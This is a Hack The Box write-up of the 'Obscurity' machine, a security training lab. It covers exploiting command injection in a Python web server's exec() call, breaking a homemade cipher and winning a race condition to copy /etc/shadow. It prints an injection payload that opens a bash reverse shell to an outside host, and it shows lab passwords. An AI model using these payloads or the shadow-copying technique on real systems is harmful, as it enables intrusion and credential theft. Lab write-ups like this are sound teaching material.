---
layout: single
title: Obscurity - Hack The Box
excerpt: "The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user's password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password."
date: 2020-05-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-obscurity/obscurity_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - custom webserver
  - command injection
  - race condition
---

![](/assets/images/htb-writeup-obscurity/obscurity_logo.png)

The Obscurity box has a vulnerable Python web application running. After finding the source code from a secret directory we find that the exec call can be command injected to get a shell as www-data. Then we have to solve a simple crypto challenge to retrieve an encryption key that decrypts a file containing the robert user's password. We finally get root by exploiting a race condition in a python script so that we can copy the /etc/shadow file and crack the root password.

## Summary

- Find the secret directory on the webserver that holds the source code for the web application
- Exploit a command injection vulnerability in the application and get a shell as www-data
- Recover the key for some homemade crypto cipher and recover the password for user robert
- Exploit a race condition in yet another python program so I can read the shadow file and crack the root password

## Recon

I see there's a custom webserver when I run my nmap scan: `BadHTTPServer`

```
root@beholder:~# nmap -sC -sV -p- 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-30 15:25 EST
Nmap scan report for obscurity.htb (10.10.10.168)
Host is up (0.025s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open  http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 30 Nov 2019 20:29:55
|     Server: BadHTTPServer
|     Last-Modified: Sat, 30 Nov 2019 20:29:55
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
[...]
9000/tcp closed cslistener

Nmap done: 1 IP address (1 host up) scanned in 88.39 seconds
```

## Website

So this company is taking a unique approach based on security by obscurity, what could go wrong? It's pretty clear I'm gonna have to exploit a custom webserver here based on the notes from the webpage. It also says they're working on a new encryption algorithm and a replacement for SSH. I'm sure the folks from Crown Sterling would be interested in this crypto vaporware garbage!

![](/assets/images/htb-writeup-obscurity/website1.png)

![](/assets/images/htb-writeup-obscurity/website2.png)

Looks like these guys haven't discovered email yet and they use their public website to message their developpers instead. I'm now going to be looking for that directory that holds the `SuperSecureServer.py` file next.

![](/assets/images/htb-writeup-obscurity/website3.png)

## Fuzzing the webserver to find the source code

I'm going to fuzz the directories to try to find the location of that file with the python source.

![](/assets/images/htb-writeup-obscurity/ffuf.png)

The server source code is located here: `http://10.10.10.168:8080/develop/SuperSecureServer.py`

## Exploiting the command injection vulnerability in the source code

A quick source code review shows that an `exec()` call is made here:

```python
 def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
```

The `exec` function is just like an `eval`, it'll execute whatever python code has been passed to it. Here's documentation snippet:

```
exec(source, globals=None, locals=None, /)
    Execute the given source in the context of globals and locals.
    
    The source may be a string representing one or more Python statements
    or a code object as returned by compile().
    The globals must be a dictionary and locals can be any mapping,
    defaulting to the current globals and locals.
    If only globals is given, locals defaults to it.
```

So what the program does here is take the path in the GET request, formats it and stores the result in the `output` variable. Here's what happen if I test that part of the code manually in the python interactive interpreter.

```
>>> exec("output = 'Document: {}'".format("/test"))
>>> output
'Document: /test'
```

That `output` variable is not even used in the program and has been placed here just to introduce that command injection vulnerability. What I can do here is store an empty value in the `output` variable but add additional code after the `output` variable assignment.

I'll test this locally first in my python shell, first I'll validate that I can execute `whoami`:

```
>>> exec("output = 'Document: {}'".format("';__import__(\"os\").system(\"whoami\")#'"))
root
```

Ok so that works. Next I'll spawn a reverse shell with:

```
>>> exec("output = 'Document: {}'".format("';__import__(\"os\").system(\"bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'\")#'"))

root@beholder:~# nc -lvnp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38520
```

Awesome, next destination: getting a shell on the target box.

I'll use the `';__import__("os").system("bash -c 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1'")#` payload and URL-encode all the characters so I don't have any problems with my curl command. The exec/eval works and I get a shell.

![](/assets/images/htb-writeup-obscurity/shell.png)

## Cracking robert's password

I have access to robert's home directory but I can't read the flag so I have to get access to his account next.

![](/assets/images/htb-writeup-obscurity/robert.png)

The `check.txt` file is the plaintext, and `out.txt` is the ciphertext:

```
www-data@obscure:/home/robert$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!

www-data@obscure:/home/robert$ xxd out.txt
xxd out.txt
00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................
00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................
00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................
00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................
00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................
00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................
00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................
00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................
00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................
00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................
000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................
000000b0: c38c c397 c289 c281 76                   ........v
```

What I really want to read is the `passwordreminder.txt` but it's also encrypted:

```
www-data@obscure:/home/robert$ xxd passwordreminder.txt
xxd passwordreminder.txt
00000000: c2b4 c391 c388 c38c c389 c3a0 c399 c381  ................
00000010: c391 c3a9 c2af c2b7 c2bf 6b              ..........k
```

Here I'll assume that the key used to encrypt `check.txt` is the same as `passwordreminder.txt` otherwise I won't be able to do much.

The `SuperSecureCrypt.py` program uses addition and modulo to encrypt/decrypt the files:

```python
[...]
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
[...]
```

The encryption works a bit like XOR where if you have the plaintext and ciphertext you can recover the key by XORing the two together. To recover the key here, I'll take the out.xt ciphertext text and decrypt it with the plaintext and this'll write the key into my x.txt output file.

```console
$ python3 ./SuperSecureCrypt.py -d -i out.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -o x.txt
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to x.txt...

$ cat x.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

I'll use `alexandrovich` as the decryption key for `passwordreminder.txt` to recover the SSH password for user robert: `SecThruObsFTW`

```
$ python3 ./SuperSecureCrypt.py -d -i passwordreminder.txt -o x.txt -k 'alexandrovich'
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to x.txt...

$ cat x.txt
SecThruObsFTW
```

![](/assets/images/htb-writeup-obscurity/flag1.png)

## Privesc

The privesc is pretty obvious, there's a python script running as root and we need to exploit it. As stated on their website, this is their own proprietary SSH program.

```
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

In short, there's a race condition in the program where it copies the contents of `/etc/shadow` to a temporary location then deletes the file. The sleep command introduces a delay we can exploit.

```python
[...]
    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
[...]
```

The copied shadow file is stored in `/tmp/SSH/` for a few milliseconds so it's possible to read it by running a bash loop to copy it outside of the `/tmp/SSH` directory before it is deleted:

![](/assets/images/htb-writeup-obscurity/shadow.png)

Time to crack that hash!

![](/assets/images/htb-writeup-obscurity/john.png)

Password is `mercedes`. We can now `su` root:

![](/assets/images/htb-writeup-obscurity/flag2.png)